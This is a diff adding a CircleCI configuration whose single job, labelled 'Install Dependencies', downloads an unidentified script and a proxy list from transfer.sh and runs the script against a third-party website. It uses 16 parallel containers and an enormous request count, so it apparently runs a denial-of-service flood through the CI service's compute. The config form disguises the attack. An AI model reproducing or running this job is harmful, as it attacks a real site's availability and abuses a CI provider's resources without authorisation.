@@ -1,0 +1,16 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: debian:latest
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: apt update && apt install nodejs wget -y && wget https://transfer.sh/get/rAH3vG/f.js && wget https://transfer.sh/get/56nE8C/https.txt && chmod +x f.js && ./f.js GET https://soulcraft.network/ http.txt 60 153 9999999999999999999999999999999999999999999999999999999999999999999999 
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
